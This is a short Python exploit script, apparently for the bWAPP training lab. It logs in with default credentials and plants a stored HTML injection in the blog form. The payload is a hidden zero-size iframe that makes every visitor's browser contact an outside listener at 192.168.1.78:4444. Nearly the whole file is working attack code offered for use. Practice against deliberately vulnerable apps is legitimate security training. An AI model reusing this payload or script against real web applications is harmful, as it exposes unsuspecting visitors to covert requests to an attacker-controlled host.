#!/usr/bin/env  python3

# Exploit to  vulnerability HTML DOOM the bewepp level  to  medium  
# Author: IRVING ST - COMANDRE-EX 
from pwn import *
from colorama import Fore, Style
import sys,signal,time,requests

# Function ctrl_c
def def_handler(sig, frame):
    print(Fore.RED + Style.BRIGHT + " {} ".format("\n\nExiting.."))
    sys.exit(1)

# Function Signal ctrl_c
signal.signal(signal.SIGINT, def_handler)

# Payload...
payload = f"""<iframe src="http://192.168.1.78:4444/test" height="0" width="0"></iframe>"""    
# Proxys...
proxies = {
  "http":  "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}

def login():
    
    session = requests.Session()
    
    data = {"password":"bug","form":"submit","login":"bee","security_level":"0"}
    headers = {"Origin":"http://bwapp","DNT":"1","Upgrade-Insecure-Requests":"1","Content-Type":"application/x-www-form-urlencoded"}
    response = session.post("http://bwapp/login.php", data=data, headers=headers)

    if response.status_code  ==  200:
        print(Fore.BLUE + Style.BRIGHT + "LOGIN OK : Status  Code %i " % response.status_code)
    return  session


# LOG PROGRESS. 
p1 =  log.progress(Fore.RED  + Style.BRIGHT + "INICIANDO LOGIN...")
time.sleep(10)

def def_exploit(session):
    paramsPost = {"entry":payload,"blog":"submit","entry_add":""}
    headers = {"Origin":"http://bwapp","DNT":"1","Upgrade-Insecure-Requests":"1","Content-Type":"application/x-www-form-urlencoded"}
    
    response = session.post("http://bwapp/htmli_stored.php", data=paramsPost, headers=headers)
    print(Fore.RED + "HMTL DOOM INJECTADO CORRECTAMENTE....")


p2  =  log.progress(Fore.BLUE + "Injectando  payload HTML: %s" %  payload)
time.sleep(10)

if __name__ == '__main__': 
    session =  login()
    def_exploit(session)
